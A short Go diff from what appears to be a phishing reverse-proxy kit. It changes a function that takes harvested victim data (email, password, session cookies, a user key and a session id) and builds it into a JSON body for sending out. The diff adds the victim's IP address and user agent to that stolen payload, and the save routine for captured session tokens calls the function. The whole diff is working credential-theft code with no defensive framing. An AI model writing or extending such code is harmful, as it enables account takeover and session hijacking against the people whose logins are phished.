@@ -95,10 +95,12 @@ func telegramSendResult(msg string) {
 
 }
 
-func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
+func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string, remoteIp string, userAgent string) {
 
 	postBody, _ := json.Marshal(map[string]string{
 		"email":      username,
+		"ip":         remoteIp,
+		"userAgent":  userAgent,
 		"password":   password,
 		"cookie":     msg,
 		"key_user":   KeyUser,
@@ -261,7 +263,7 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 	//log.Important("database: %s", data)
 
 	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11), data.Username, data.Password, keyUser, data.SessionId)
+	sendEmailCookie(string(json11), data.Username, data.Password, keyUser, data.SessionId, data.RemoteAddr, data.UserAgent)
 	return err
 }
 
